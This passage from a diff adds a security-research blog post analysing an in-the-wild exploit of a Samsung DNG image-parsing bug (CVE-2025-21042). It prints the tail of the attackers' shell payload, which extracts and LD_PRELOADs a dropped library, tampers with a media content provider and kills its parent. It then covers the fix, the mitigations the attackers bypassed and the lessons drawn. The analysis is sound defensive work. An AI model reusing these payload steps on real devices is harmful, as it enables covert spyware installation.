+<span>tail</span> <span>-c</span> <span>$((</span> <span>390245</span> <span>))</span> <span>"</span><span>$image</span><span>"</span> <span>&gt;</span> /data/data/com.samsung.ipservice/files/z.zip <span>&amp;&amp;</span> unzip <span>-o</span> <span>-d</span> / /data/data/com.samsung.ipservice/files/z.zip <span>&amp;&amp;</span> <span>chmod</span> +x /data/data/com.samsung.ipservice/files/b.so<span>;</span>
+<span>R</span><span>=</span>I <span>SEP</span><span>=</span>CAFEBABE <span>LD_PRELOAD</span><span>=</span>/data/data/com.samsung.ipservice/files/b.so /system/bin/id<span>;</span>
+content write <span>--uri</span> <span>"content://com.samsung.cmh/files?service_flag=update%20files%20SET%20serviceflag%3D%20serviceflag%7C66304"</span><span>;</span>
+<span>kill</span> <span>-9</span> <span>$ppid</span>
+</code></pre></div>
+
+<p>It performs a series of actions:</p>
+
+<ul>
+  <li>It will ping a C2 server with a custom identifier</li>
+  <li>It deletes previous dropped artifacts, if any.</li>
+  <li>It searches through all WhatsApp images for itself (using a unique string)</li>
+  <li>It unzips <code>b.so</code> from itself into <code>/data/data/com.samsung.ipservice/files/b.so</code>. Effectively, it is a polyglot of a DNG and ZIP file.
+    <ul>
+      <li>Note that only the <code>com.samsung.ipservice</code> process is allowed to write here, which confirms this is the targeted process.</li>
+    </ul>
+  </li>
+  <li>The second-to-last command contains the following <code>service_flag</code> URL decoded: <code>update files SET serviceflag= serviceflag|66304</code> . That last value (0x10300)  is a flag bitmask that will set the <code>IPService</code>, <code>FaceService</code> and <code>StoryService</code> in <code>com.samsung.cmh</code>’s <code>files</code> table. These flags are used by the different services to track which files they need to process (flag bit set to 0) and have already processed (flag bit set to 1). The likely objective of the attackers here is to prevent future reparsing by these services of the images.</li>
+</ul>
+
+<p>Finally it runs <code>b.so</code>, the agent.</p>
+
+<h2>Fix</h2>
+
+<p>Curiously, this issue was silently fixed in <a href="https://security.samsungmobile.com/securityUpdate.smsb?year=2025&amp;month=04">Samsung’s April 2025 updates</a>. In September 2025, a CVE was assigned (CVE-2025-21042) by Samsung and the security bulletin updated. Note that not all supported Samsung devices are serviced monthly security updates. Some devices are part of a <a href="https://security.samsungmobile.com/workScope.smsb">quarterly or biannual security update schedule</a>, which means they might have received the fix at a later date. On December 11, 2025, Samsung told us the following: “patches for SVE-2025-1959 have been deployed to all devices supported by Security Update, without exception.”</p>
+
+<p>The fixed function now looks like below (simplified version). The bold parts are the added checks.</p>
+
+<div><pre><code><span>__int64</span> <span>__fastcall</span> <span>QuramDngOpcodeDeltaPerColumn</span><span>::</span><span>processArea</span><span>(</span>
+
+  <span>QuramDngOpcode</span> <span>*</span><span>opcode</span><span>,</span>
+  <span>QuramDngDecoder</span> <span>*</span><span>decoder</span><span>,</span>
+  <span>QuramDngImage</span> <span>*</span><span>image</span><span>,</span>
+  <span>QuramDngRect</span> <span>*</span><span>rect</span><span>)</span>
+
+<span>{</span>
+
+<span>...</span>
+    <span>image_buffer</span> <span>=</span> <span>image</span><span>-&gt;</span><span>buffer</span><span>;</span>
+<span>...</span>
+
+    <span>image_number_of_planes</span> <span>=</span> <span>image_buffer</span><span>-&gt;</span><span>planes</span><span>;</span>  <span>// 3</span>
+    <span>opcode_first_plane</span> <span>=</span> <span>opcode</span><span>-&gt;</span><span>plane</span><span>;</span>  <span>// 5125</span>
+<span>....</span>
+    <span>opcode_number_of_planes</span> <span>=</span> <span>opcode</span><span>-&gt;</span><span>planes</span><span>;</span>  <span>// 5123</span>
+    <span>opcode_last_plane</span> <span>=</span> <span><b><u>opcode_first_plane</u></b></span> <span>+</span> <span>opcode_number_of_planes</span><span>;</span>  <span>// 5125 + 5123 = 10248</span>
+<span>...</span>
+        <span>if</span> <span>(</span> <b><u><span>opcode_first_plane</span> <span>&lt;</span> <span>opcode_last_plane</span></u></b><span>// 5125 &lt; 10248</span>
+      <span>&amp;&amp;</span> <span>opcode_first_plane</span> <span>&lt;</span> <span>image_number_of_planes</span> <span>)</span>  <span>// 5125 &lt; 3</span>
+        <span>{</span>
+<span>...</span>  <span>// We will never go here</span>
+          <span>current_plane</span> <span>=</span> <span>opcode_first_plane</span><span>;</span>
+<span>...</span>
+        <span>do</span>
+        <span>{</span>
+<span>...</span> <span>// Add delta to the value in the raw pixel buffer at offset corresponding to plane `current_plane`</span>
+            <span>current_plane</span><span>++</span><span>;</span>
+        <span>}</span>
+        <span>while</span> <span>(</span> <span>current_plane</span> <span>&lt;</span> <span>opcode_last_plane</span> 
+               <span>&amp;&amp;</span> <b><u><span>current_plane</span> <span>&lt;</span> <span>image_number_of_planes</span></u></b> <span>);</span>
+<span>...</span>
+<span>}</span>
+</code></pre></div>
+
+<p>As we can see from the fix:</p>
+
+<ul>
+  <li>The <code>opcode_last_plane</code> is now calculated correctly.</li>
+  <li>Before dereferencing the raw pixel buffer, a check is performed that the <code>current_plane</code> is within the number of planes of the image.</li>
+</ul>
+
+<h2>Mitigations</h2>
+
+<p>Except for some ASLR bypassing tricks and a little bit of JOP work, no mitigations posed a significant hurdle for the attackers:</p>
+
+<ul>
+  <li>No control flow integrity mitigations, like PAC or BTI, are compiled into the Quram library. This allowed the attackers to use arbitrary addresses as JOP gadgets and construct a bogus vtable.</li>
+  <li>The “hardened” scudo allocator wasn’t an obstacle either. The heap spraying primitives - more or less inherent to the DNG format - are quite powerful and allow for a well predicted heap layout, even in the presence of scudo’s randomization strategy. The absence of the quarantine feature is also convenient to deterministically reclaim the spot of the stage 2 image.</li>
+</ul>
+
+<p>MTE would likely have prevented both:</p>
+
+<ul>
+  <li>the initial vulnerability trigger to corrupt the image dimensions</li>
+  <li>the hundreds of subsequent out of bounds <code>MapTable</code> and <code>DeltaPerColumn</code> operations</li>
+</ul>
+
+<p>preventing reliable exploitation of this vulnerability, at least with the current exploit strategy.</p>
+
+<h2>Conclusion</h2>
+
+<p>This case illustrates how certain image formats provide strong primitives out of the box for turning a single memory corruption bug into interactionless ASLR bypasses and remote code execution. By corrupting the bounds of the pixel buffer using the bug, the rest of the exploit could be performed by using the “weird machine” that the DNG specification and its implementation provide.</p>
+
+<p>The bug exploited in this case is quite shallow and could have been found manually or through fuzzing. As <a href="https://projectzero.google/reporting-transparency.html">Project Zero’s Reporting Transparency</a> illustrates, several other vulnerabilities in the same component have been discovered.</p>
+
+<p>These types of exploits do not need to be part of long and complex exploit chains to achieve something useful for attackers. By finding ways to reach the right attack surface and using a single vulnerability, attackers are able to access all the images and videos of an Android’s media store, which is a very interesting capability for spyware vendors.</p>
+
+<p>I would like to thank everyone who contributed to this analysis:</p>
+
+<ul>
+  <li>Meta for the initial leads</li>
+  <li>Brendon Tiszka of Google Project Zero for the research on how the <code>com.samsung.ipservice</code> attack surface can be reached and the followup research he performed into the Quram library, <a href="https://googleprojectzero.blogspot.com/p/reporting-transparency.html">leading to several more discoveries</a>.</li>
+  <li>Clement Lecigne of Google Threat Intelligence Group for assisting in the analysis</li>
+</ul>
+
+
+        </section>
+      </article>
+      
+      
+    </div></div>
+  </div>
+</body>
+</html>
